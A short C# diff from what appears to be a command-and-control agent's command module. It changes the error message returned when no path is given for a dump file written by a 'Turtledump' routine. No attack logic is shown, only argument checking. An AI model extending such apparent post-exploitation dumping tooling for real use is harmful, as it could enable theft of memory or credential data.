@@ -18,7 +18,7 @@ namespace Agent.Commands
         {
             if (task.Args is null || task.Args.Length == 0)
             {
-                return "No Output path provided";
+                return "Error Provide Args <fullPathToDumpFile>";
             }
             var dumpPath = task.Args[0];
             if (!ExecuteTurtledump(dumpPath))
